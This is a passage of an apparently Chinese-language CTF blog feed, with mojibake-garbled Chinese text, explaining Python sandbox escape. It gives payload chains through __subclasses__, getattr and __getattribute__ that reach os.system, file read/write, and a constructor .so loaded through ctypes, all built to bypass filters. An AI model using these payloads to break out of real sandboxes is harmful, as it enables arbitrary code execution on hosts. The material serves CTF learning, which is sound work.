éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©ï¼Œå®ƒä»¬ä¸€å®šè¦è¿‡æ»¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ‰å¾ˆå¤šå˜å½¢çš„æ–¹å¼ï¼Œå¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€å˜é‡æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰</p><h3 id="getattr"><a href="#getattr" class="headerlink" title="getattr()"></a>getattr()</h3><p><code>__globals__</code>ï¼šè¿”å›ä¸€ä¸ªå½“å‰ç©ºé—´ä¸‹èƒ½ä½¿ç”¨çš„æ¨¡å—ï¼Œæ–¹æ³•å’Œå˜é‡çš„å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">test</span>():</span></span><br><span class="line"><span class="meta">... </span>    name=<span class="string">&quot;Moonback&quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t=test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;name&quot;</span>)<span class="comment">#è·å–nameå±æ€§ï¼Œå­˜åœ¨å°±æ‰“å°å‡ºæ¥ã€‚</span></span><br><span class="line"><span class="string">&#x27;Moonback&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;run&quot;</span>)<span class="comment">#è·å–runæ–¹æ³•ï¼Œå­˜åœ¨å°±æ‰“å°å‡ºæ–¹æ³•çš„å†…å­˜åœ°å€ã€‚</span></span><br><span class="line">&lt;bound method test.run of &lt;__main__.test object at <span class="number">0x00000110F74FC4E0</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(t,<span class="string">&quot;run&quot;</span>)() <span class="comment">#è·å–runæ–¹æ³•ï¼Œåé¢åŠ æ‹¬å·å¯ä»¥å°†è¿™ä¸ªæ–¹æ³•è¿è¡Œã€‚</span></span><br><span class="line"><span class="string">&#x27;HelloWorld&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>.</code>è¢«waf,å¯ä»¥ç”¨<code>getattr()</code>æ¥æ›¿ä»£ã€‚<br><strong>payloadï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è½¬æ¢è¿‡ç¨‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__ ==&gt; getattr([],&#x27;__class__&#x27;)</span><br><span class="line">[].__class__.__base__ ==&gt; getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59] ==&gt; getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59]#åé¢æœ‰æ‹¬å·</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__ ==&gt; getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;] ==&gt; getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__class__&#x27;),&#x27;__base__&#x27;),&#x27;__subclasses__&#x27;)()[59],&#x27;__init__&#x27;),&#x27;__globals__&#x27;)[&#x27;linecache&#x27;],&#x27;__dict__&#x27;)[&#x27;os&#x27;]</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">&#x27;__class__&#x27;</span>),<span class="string">&#x27;__base__&#x27;</span>),<span class="string">&#x27;__subclasses__&#x27;</span>)()[<span class="number">59</span>],<span class="string">&#x27;__init__&#x27;</span>),<span class="string">&#x27;__globals__&#x27;</span>)[<span class="string">&#x27;linecache&#x27;</span>],<span class="string">&#x27;__dict__&#x27;</span>)[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•çš„å¥½å¤„æ˜¯ç»•è¿‡.å¹¶ä¸”å‡½æ•°åæˆ–å±æ€§åéƒ½ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼å†™å…¥payloadä¸­ã€‚é‚£ä¹ˆå¯æ‹“å±•çš„æ–¹æ³•å°±æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ï¼š</p><p>å¦‚æœ<code>_</code>è¢«wafäº†,å¯ä»¥ç”¨<code>dir(0)[0][0]</code>ä»£æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;_&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ä¸Šé¢çš„payloadå¯ä»¥è½¬æ¢ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;class&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;base&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;subclasses&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)()[<span class="number">59</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;init&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>),dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;globals&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">&#x27;linecache&#x27;</span>],dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>+<span class="string">&#x27;dict&#x27;</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">2</span>)[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__()"></a><code>__getattribute__()</code></h3><p><code>__getattribute__</code>æ˜¯å±æ€§è®¿é—®æ‹¦æˆªå™¨ï¼Œå°±æ˜¯å½“è¿™ä¸ªç±»çš„å±æ€§è¢«è®¿é—®æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„<code>__getattribute__</code>æ–¹æ³•ã€‚<br><strong>é€šè¿‡__getattribute__æˆ‘ä»¬å¯ä»¥ä¼ å­—ç¬¦ä¸²æ¥è¿›è¡Œæ–¹æ³•çš„è°ƒç”¨</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Test</span>(<span class="params">object</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.name=<span class="string">&#x27;Test&#x27;</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            print(self.name)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=Test()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__getattribute__(<span class="string">&#x27;echo&#x27;</span>)()</span><br><span class="line">Test</span><br></pre></td></tr></table></figure><p>åº”ç”¨åœºæ™¯: æ¯”å¦‚è¯´ä¸€ä¸ªæ²™ç›’wafäº†â€™lsâ€™å¯¼è‡´å±æ€§â€™globalsâ€™ä¸èƒ½ç”¨ï¼Œé‚£ä¹ˆpayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&quot;linecache&quot;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥è½¬æ¢ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&#x27;func_global&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&quot;linecache&quot;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>func_globals</code>: è¿™ä¸ªå±æ€§æŒ‡å‘å®šä¹‰å‡½æ•°æ—¶çš„å…¨å±€å‘½åç©ºé—´ï¼Œè¿”å›å®ƒæ‰€æœ‰è°ƒç”¨çš„åŸºç±»å’Œå‡½æ•°<br><code>__init__</code>ï¼š è¿”å›ä¸€ä¸ªå‡½æ•°å¯¹è±¡<br><code>__dict__</code>ï¼šè¿”å›æ‰€æœ‰å±æ€§ï¼ŒåŒ…æ‹¬å±æ€§ï¼Œæ–¹æ³•ç­‰</p><h3 id="æ„é€ soåº“"><a href="#æ„é€ soåº“" class="headerlink" title="æ„é€ soåº“"></a>æ„é€ soåº“</h3><p>åœ¨<code>().__class__.__bases__[0].__subclasses__()</code>ä¸­å‘ç°æœ‰å¯ç”¨çš„ç±»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;type <span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">CDLL</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªsoåº“ï¼Œåˆ—ä¸€ä¸‹/home/ctf/ä¸‹çš„æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;  </span></span><br><span class="line">void my_init(void) __attribute__((constructor)); </span><br><span class="line">void my_init(void)  </span><br><span class="line">&#123;  </span><br><span class="line">    system(<span class="string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>å°†ç¼–è¯‘å¥½çš„soç›´æ¥äºŒè¿›åˆ¶å†™å…¥/tmp/bk.so<br>ä½¿ç”¨ctypesåŠ è½½so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">86</span>](().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">85</span>]).LoadLibrary(<span class="string">&#x27;/tmp/bk.so&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="fä¿®é¥°ç¬¦"><a href="#fä¿®é¥°ç¬¦" class="headerlink" title="fä¿®é¥°ç¬¦"></a>fä¿®é¥°ç¬¦</h3><p>åœ¨PEP 498ä¸­å¼•å…¥äº†æ–°çš„å­—ç¬¦ä¸²ç±»å‹ä¿®é¥°ç¬¦ï¼šfæˆ–Fï¼Œç”¨fä¿®é¥°çš„å­—ç¬¦ä¸²å°†å¯ä»¥æ‰§è¡Œä»£ç ã€‚å¯ä»¥å‚è€ƒæ­¤æ–‡æ¡£ <a href="https://www.python.org/dev/peps/pep-0498/">https://www.python.org/dev/peps/pep-0498/</a></p><p>åªæœ‰åœ¨python3.6.0+çš„ç‰ˆæœ¬æ‰æœ‰è¿™ä¸ªæ–¹æ³•ã€‚ç®€å•æ¥è¯´ï¼Œå¯ä»¥ç†è§£ä¸ºå­—ç¬¦ä¸²å¤–å±‚å¥—äº†ä¸€ä¸ªexec()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="keyword">print</span>(<span class="string">&quot;MoonBack&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">MoonBack</span><br><span class="line"><span class="string">&#x27;None&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;dir&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"> é©±åŠ¨å™¨ C ä¸­çš„å·æ˜¯ Windows</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼äºphpä¸­çš„<code>&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;</code>ï¼Œä½†pythonä¸­æ²¡æœ‰å°†æ™®é€šå­—ç¬¦ä¸²è½¬æˆfå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨æ—¶æ•ˆæœä¸æ˜ã€‚</p><h2 id="ä¸€äº›å¸¸ç”¨payload"><a href="#ä¸€äº›å¸¸ç”¨payload" class="headerlink" title="ä¸€äº›å¸¸ç”¨payload"></a>ä¸€äº›å¸¸ç”¨payload</h2><h3 id="åˆ©ç”¨fileç±»å®Œæˆæ–‡ä»¶è¯»å–"><a href="#åˆ©ç”¨fileç±»å®Œæˆæ–‡ä»¶è¯»å–" class="headerlink" title="åˆ©ç”¨fileç±»å®Œæˆæ–‡ä»¶è¯»å–"></a>åˆ©ç”¨fileç±»å®Œæˆæ–‡ä»¶è¯»å–</h3><p>åˆ©ç”¨objectå­ç±»ä¸­çš„fileæ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°è¿”å›çš„å†…å®¹æ˜¯ï¼Œç›¸å½“äºopen()å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;test.py&#x27;</span>).read()</span><br><span class="line"><span class="comment"># ç­‰ä»·äº open(&#x27;test.py&#x27;).read()</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨å…¶ä»–ç±»ä¸­çš„OSæ¨¡å—å®Œæˆå‘½ä»¤æ‰§è¡Œ"><a href="#è°ƒç”¨å…¶ä»–ç±»ä¸­çš„OSæ¨¡å—å®Œæˆå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="è°ƒç”¨å…¶ä»–ç±»ä¸­çš„OSæ¨¡å—å®Œæˆå‘½ä»¤æ‰§è¡Œ"></a>è°ƒç”¨å…¶ä»–ç±»ä¸­çš„OSæ¨¡å—å®Œæˆå‘½ä»¤æ‰§è¡Œ</h3><p>åœ¨å½“å‰æ²™ç®±ä¸­ï¼Œ<strong>import</strong>ç­‰æ¨¡å—è¢«ç¦ç”¨ï¼Œä½†æ˜¯ï¼Œåœ¨åˆ«çš„æ¨¡å—ä¸­å¦‚æœæœ¬èº«åŠ è½½æœ‰osçš„æ¨¡å—ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è°ƒç”¨çš„ã€‚å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;</span></span><br><span class="line"><span class="class"># åœ¨è¿™ä¸ªç±»ä¸­ï¼Œè°ƒç”¨äº†<span class="title">os</span>æ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é—´æ¥æŠŠ<span class="title">os</span>æ¨¡å—è°ƒç”¨è¿›æ¥ã€‚</span></span><br><span class="line"><span class="class"># <span class="title">win</span> 32</span></span><br><span class="line"><span class="class">().<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[54]</span></span><br><span class="line"><span class="class"># <span class="title">linux</span> 2</span></span><br><span class="line"><span class="class">().<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class"># <span class="title">linux</span> 2 </span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">(<span class="params"></span>).__class__.__bases__[<span class="number">0</span>].__subclasses__(<span class="params"></span>)[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="params"><span class="string">&#x27;ls&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="class"># <span class="title">func_globals</span>:</span>è¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨ï¼›</span><br></pre></td></tr></table></figure><h3 id="éå†æ‰¾åˆ°å…¶ä»–çš„é€ƒé€¸æ–¹æ³•"><a href="#éå†æ‰¾åˆ°å…¶ä»–çš„é€ƒé€¸æ–¹æ³•" class="headerlink" title="éå†æ‰¾åˆ°å…¶ä»–çš„é€ƒé€¸æ–¹æ³•"></a>éå†æ‰¾åˆ°å…¶ä»–çš„é€ƒé€¸æ–¹æ³•</h3><p>é€šè¿‡ä¸Šé¢çš„ä¸€äº›ç»•è¿‡å§¿åŠ¿æˆ‘ä»¬å‘ç°ï¼Œæ— å¤–ä¹æ˜¯åˆ©ç”¨ subclasses ä¸­çš„ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•æˆ–è€…æ¨¡å—ç„¶åæ¥è°ƒç”¨ä¸€äº›å‡½æ•°æˆ–è€…æ¨¡å—æ¥è¯»å–æ–‡ä»¶ï¼Œæˆ–è€…æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥éå†æ‰€æœ‰çš„ç³»ç»Ÿåº“ï¼Œç„¶åæ‰¾åˆ°æ‰€æœ‰çš„ä½¿ç”¨äº†osç­‰æ¨¡å—çš„æ¨¡å—ï¼Œæœ€åéå† subclasses åˆ—è¡¨ï¼Œæ‰¾åˆ°æ‰€æœ‰å¯ä»¥ç»•è¿‡çš„å§¿åŠ¿ã€‚</p><p>åŒ…åŒ…å“¥çš„python2 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨file()å‡½æ•°è¯»å–æ–‡ä»¶ï¼šï¼ˆå†™ç±»ä¼¼ï¼‰</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;./test.py&#x27;</span>).read()</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># é‡æ–°è½½å…¥__builtins__ï¼š</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="comment">#è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ __getattibute__ æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><p>n3k0å¤§å“¥çš„python3 payload<br><strong>python3å„ä¸ªå°ç‰ˆæœ¬ä¹‹é—´æœ‰åŒºåˆ«ï¼Œæœ‰çš„payloadå¯ä»¥ç”¨äºpy3.7 æœ‰çš„å¯ä»¥ç”¨äºpy3.5</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">104</span>].__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].modules[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="http://www.gtfly.top/2019/07/25/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0.[html](www.gtfly.top/2019/07/25/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0.html)">www.gtfly.top/2019/07/25/pythonæ²™ç›’é€ƒé€¸å­¦ä¹ .[html](www.gtfly.top/2019/07/25/pythonæ²™ç›’é€ƒé€¸å­¦ä¹ .html)</a></p><p><a href="https://xz.aliyun.com/t/52">https://xz.aliyun.com/t/52</a></p><p><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)">https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/[](https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)</a></p><p><a href="https://www.freebuf.com/articles/system/203208.html">https://www.freebuf.com/articles/system/203208.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfåˆ·é¢˜-ç»¼åˆç¯‡</title>
      <link href="2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/"/>
